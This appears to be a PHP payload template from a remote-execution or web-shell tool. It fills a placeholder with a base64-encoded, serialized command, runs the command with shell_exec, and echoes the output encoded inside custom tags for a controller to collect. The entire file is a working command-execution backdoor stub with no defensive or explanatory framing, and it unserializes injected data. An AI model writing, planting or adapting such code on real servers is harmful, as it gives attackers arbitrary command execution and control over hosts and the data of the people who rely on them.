<?php

error_reporting(E_ALL);

function softdie($txt){
	$array = array();
	$array['output'] = shell_exec(unserialize(base64_decode('[[[execute]]]')));
	$array['result'] = $txt;
	echo '<aefer>'.base64_encode(serialize($array)).'</aefer>';die();
}

softdie('DONE');

